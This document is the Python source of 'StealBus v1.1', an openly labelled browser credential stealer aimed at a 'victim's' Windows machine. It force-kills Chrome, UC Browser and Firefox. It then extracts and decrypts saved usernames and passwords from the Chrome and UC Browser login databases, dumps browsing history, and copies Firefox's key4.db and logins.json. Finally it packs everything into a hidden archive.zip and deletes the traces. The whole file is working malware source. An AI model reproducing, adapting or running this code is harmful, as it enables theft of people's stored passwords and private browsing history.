#StealBus v1.1
#Instagram @ninjadak1ng

import platform
import subprocess
import os, sys
import sqlite3
import win32crypt
import zipfile
import win32con, win32api
import shutil
from shutil import copyfile


def killprocess():
    os.system("Taskkill /F /IM chrome.exe")
    os.system("Taskkill /F /IM UCBrowser.exe")
    os.system("Taskkill /F /IM firefox.exe")

if (sys.platform.startswith('win') == True ):
    print('Windows ' + platform.version() + ' Detected!')

    process = os.popen('tasklist ').read()
    if 'UCBrowser.exe' or 'chrome.exe' or 'firefox.exe' in process:
        killprocess()
    else:
        pass


    def chromelogindata():  
        data_path = os.path.expanduser('~')+"\AppData\Local\Google\Chrome\User Data\Default"
        login_db = os.path.join(data_path, 'Login Data')
        c = sqlite3.connect(login_db)
        cursor = c.cursor()
        select_statement = "SELECT origin_url, username_value, password_value FROM logins"
        cursor.execute(select_statement)
        login_data = cursor.fetchall()
        credential = {}
        for url, user_name, pwd, in login_data:
            pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0) 
            credential[url] = (user_name, pwd[1])
        with open('chrome_credentials.txt', 'w') as f:
            for url, credentials in credential.iteritems():
                if credentials[1]:
                    f.write("\n"+url+"\n"+credentials[0].encode('utf-8')+ " >> "+credentials[1]+"\n")
                else:
                    print("Username Password Not Found!!! \n Seems Like Chrome Browser is not installed on Victims Device")
            f.write("\n\n" + "[+]Done")
        
    def chromehistory(): #This Functions logs all chrome history in chrome_history.txt
        history_path = os.path.expanduser('~')+"\AppData\Local\Google\Chrome\User Data\Default"
        login_db = os.path.join(history_path, 'History')
        c = sqlite3.connect(login_db)
        cursor = c.cursor()
        select_statement = "SELECT title, url FROM urls"
        cursor.execute(select_statement)
        history = cursor.fetchall()
        with open ('chrome_history.txt','w') as f:
            for title, url in history:
                f.write("\n"+  title.encode('utf-8').strip() + " >> " + url.encode('utf-8').strip() + "\n")
            f.write("\n\n" + "[+]Done")

    #Checking if chrome is installed :
    chromepath = os.path.expanduser('~')+"\AppData\Local\Google\Chrome\User Data\Default"
    if os.path.isdir(chromepath) == True:
        chromelogindatapath = chromepath + '\\'+'Login Data'
        if os.path.isfile(chromelogindatapath) == True:
            chromelogindata()
            chromehistory()
        else:
            with open('chrome_credentials.txt','w') as f:
                f.write("Unable to find Chrome Credentials & History :(")
            pass
    else:
        with open('chrome_credentials.txt','w')as g:
            g.write("Unable to locate Chrome DATA Path !!!")
        pass

    #For UCBrowser
    def UClogindata(): #This Functions logs all saved passwords in UC_credentials.txt
        uc_path = os.path.expanduser('~')+"\AppData\Local\UCBrowser"
        source = os.listdir(uc_path)
        data_path = uc_path+'\\'+source[0]+'\\'+'Default'
        login_db = os.path.join(data_path, 'UC Login Data.18')
        c = sqlite3.connect(login_db)
        cursor = c.cursor()
        select_statement = "SELECT origin_url, username_value, password_value FROM wow_logins"
        cursor.execute(select_statement)
        login_data = cursor.fetchall()
        credential = {}
        for url, user_name, pwd, in login_data:
            pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0) 
            credential[url] = (user_name, pwd[1])
        with open('UC_credentials.txt', 'w') as f:
            for url, credentials in credential.iteritems():
                if credentials[1]:
                    f.write("\n"+url+"\n"+credentials[0].encode('utf-8')+ " >> "+credentials[1]+"\n")
                else:
                    print("Username Password Not Found!!! \n Seems Like UC Browser PC is not installed on Victims Device")
            f.write("\n\n" + "[+]Done")

    def UChistory():
        UC_path = os.path.expanduser('~')+"\AppData\Local\UCBrowser"
        path = os.listdir(UC_path)
        history_path = UC_path+'\\'+path[0]+'\\'+'Default'
        login_db = os.path.join(history_path, 'History.32')
        c = sqlite3.connect(login_db)
        cursor = c.cursor()
        select_statement = "SELECT title, url FROM urls"
        cursor.execute(select_statement)
        history = cursor.fetchall()
        with open ('UC_history.txt','w') as f:
            for title, url in history:
                f.write("\n" +  title.encode('utf-8').strip() + " >> " + url.encode('utf-8').strip() + "\n")
            f.write("\n\n" + "#CHEERS TO ninjadak1ng!!!")

    ucpath32 = "C:\Program Files (x86)\UCBrowser"
    ucpath64 = "C:\Program Files\UCBrowser"
    if os.path.isdir(ucpath32) or os.path.isdir(ucpath64)  == True:
        ucpath = os.path.expanduser('~')+"\AppData\Local\UCBrowser"
        sourcee = os.listdir(ucpath)
        datapath = ucpath+'\\'+sourcee[0]+'\\'+'Default'
        datanewpath = datapath+'\\'+'UC Login Data.18'
        if os.path.isfile(datanewpath) == True:
            UClogindata()
            UChistory()
        else:
            with open('uc_credentials.txt','w')as uccds:
                uccds.write('Unable to find UC Login Credentials')
            pass
    else:
        with open('uc_credentials.txt','w')as uccd:
            uccd.write("Unable to Locate UC Browser Installation!!!")
        pass

    def mozilla_steal():
        moz_path = os.path.expanduser('~')+"\AppData\Roaming\Mozilla\Firefox\Profiles"
        source = os.listdir(moz_path)
        newMozPath = moz_path+"\\"+source[0]
        key = newMozPath+'\\'+'key4.db'
        logins = newMozPath+'\\'+'logins.json'
        copyfile(key,'key4.db.txt')
        copyfile(logins,'logins.json.txt')

    mozpath = os.path.expanduser('~')+"\AppData\Roaming\Mozilla\Firefox\Profiles"
    if os.path.isdir(mozpath) == True:
        mozilla_steal()
    else:
        with open('moz_details.txt','w')as moz:
            moz.write('Unable to loacte Mozilla Firefox Installation !!!')
        pass

    path = os.getcwd() +'\\'+'archive.zip'
    azip = zipfile.ZipFile(path, 'w')
    txtpath = os.getcwd()
    for folder, subfolders, files in os.walk(txtpath):
        for file in files:
            if file.endswith('.txt'):
                azip.write(os.path.join(folder, file), file,compress_type = zipfile.ZIP_DEFLATED)
                os.remove(os.path.join(folder, file))
    azip.close()
    win32api.SetFileAttributes('archive.zip',win32con.FILE_ATTRIBUTE_HIDDEN)

else :
    sys.exit(0)

    
